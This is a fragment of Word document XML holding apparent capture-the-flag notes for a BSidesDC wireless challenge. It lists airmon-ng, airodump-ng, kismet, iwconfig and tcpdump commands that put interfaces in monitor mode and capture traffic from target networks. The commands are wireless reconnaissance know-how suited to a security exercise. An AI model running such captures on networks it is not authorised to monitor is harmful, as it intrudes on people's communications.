    <w:p w14:paraId="2FEF6097" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="23CD8098" w14:textId="77777777" w:rsidR="0053024B" w:rsidRDefault="0053024B" w:rsidP="0053024B">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>kismet</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> on wlan1 all channels USE SCREEN</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BFFEA54" w14:textId="77777777" w:rsidR="0053024B" w:rsidRDefault="0053024B" w:rsidP="00EB60F0">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D595AB3" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>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airodump</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--channel 1 –w /root/Desktop/dump wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37F93056" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6DC02CA1" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00C70BD1" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C70BD1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C70BD1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C70BD1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="008C666C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">wlan1mon </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essid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">-regex </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>BSidesDC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">* </w:t>
      </w:r>
      <w:r w:rsidRPr="008C666C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>–w</w:t>
      </w:r>
      <w:r w:rsidRPr="00C70BD1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> /root/Desktop/CTF</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capture.cap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="007D1115" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5904F804" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>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nohup</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008C666C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tcpdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008C666C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> –</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008C666C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008C666C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan1mon –w /root/Desktop/CTF/capture</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>2.cap</w:t>
      </w:r>
      <w:r w:rsidRPr="008C666C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57B76C15" w14:textId="34B417C0" w:rsidR="00EB60F0" w:rsidRPr="0053024B" w:rsidRDefault="00EB60F0" w:rsidP="0053024B">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008C666C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72D04B13" w14:textId="77777777" w:rsidR="00477221" w:rsidRPr="004B4794" w:rsidRDefault="00C3132B" w:rsidP="004B4794">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4794">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r w:rsidR="00477221" w:rsidRPr="004B4794">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>tart interfaces in monitor mode</w:t>
      </w:r>
      <w:r w:rsidR="0027750B">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0027750B" w:rsidRPr="0027750B">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>(run start</w:t>
      </w:r>
      <w:r w:rsidR="0027750B">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> script</w:t>
      </w:r>
      <w:r w:rsidR="0027750B" w:rsidRPr="0027750B">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BDD0D51" w14:textId="77777777" w:rsidR="004B4794" w:rsidRDefault="004B4794" w:rsidP="004B4794">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A54A82E" w14:textId="77777777" w:rsidR="00477221" w:rsidRPr="00FB3D55" w:rsidRDefault="00477221" w:rsidP="00FB3D55">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00FB3D55">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airmon</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00FB3D55">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00FB3D55">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> start wlan1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CC4B8B1" w14:textId="77777777" w:rsidR="00E0380B" w:rsidRPr="00E0380B" w:rsidRDefault="00E0380B" w:rsidP="00477221">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71EE18D1" w14:textId="77777777" w:rsidR="00477221" w:rsidRPr="00FB3D55" w:rsidRDefault="00477221" w:rsidP="00FB3D55">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00FB3D55">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airmon</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00FB3D55">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00FB3D55">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> start wlan2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="563B04CF" w14:textId="77777777" w:rsidR="00E0380B" w:rsidRPr="00E0380B" w:rsidRDefault="00E0380B" w:rsidP="00477221">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31344ED8" w14:textId="77777777" w:rsidR="00E0380B" w:rsidRPr="00FB3D55" w:rsidRDefault="00477221" w:rsidP="00FB3D55">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00FB3D55">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airmon</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00E0380B" w:rsidRPr="00FB3D55">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00FB3D55">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> start wlan3</w:t>
      </w:r>
      <w:r w:rsidR="00C00747" w:rsidRPr="00FB3D55">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DD0B58A" w14:textId="77777777" w:rsidR="00AE04E9" w:rsidRDefault="00AE04E9" w:rsidP="00477221">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1AD11E0A" w14:textId="6232AA07" w:rsidR="00AE04E9" w:rsidRDefault="00AE04E9" w:rsidP="00AE04E9">
      <w:pPr>
        <w:ind w:firstLine="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iwconfig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan0 mode monitor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="637A343B" w14:textId="4CB1AC47" w:rsidR="00AE04E9" w:rsidRDefault="00AE04E9" w:rsidP="00AE04E9">
      <w:pPr>
        <w:ind w:firstLine="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iwconfig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan0 channel 6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F6C6EBD" w14:textId="77777777" w:rsidR="00F36867" w:rsidRDefault="00F36867" w:rsidP="00477221">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2046F7DA" w14:textId="77777777" w:rsidR="00071C0E" w:rsidRDefault="00A74219" w:rsidP="00071C0E">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Inventory targets</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D9F1F70" w14:textId="77777777" w:rsidR="00071C0E" w:rsidRDefault="00071C0E" w:rsidP="00071C0E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C860333" w14:textId="44BB736C" w:rsidR="00071C0E" w:rsidRDefault="006A34C8" w:rsidP="00FB3D55">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00FB3D55">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidR="00A14927">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>irodump</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00A14927">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00A14927">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:r w:rsidR="00B20DC5" w:rsidRPr="00FB3D55">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B20DC5" w:rsidRPr="00FB3D55">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>essid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B20DC5" w:rsidRPr="00FB3D55">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">-regex </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00A14927">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>BSidesDC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00A14927">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ACB6EB9" w14:textId="77777777" w:rsidR="00A14927" w:rsidRPr="00FB3D55" w:rsidRDefault="00A14927" w:rsidP="00FB3D55">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
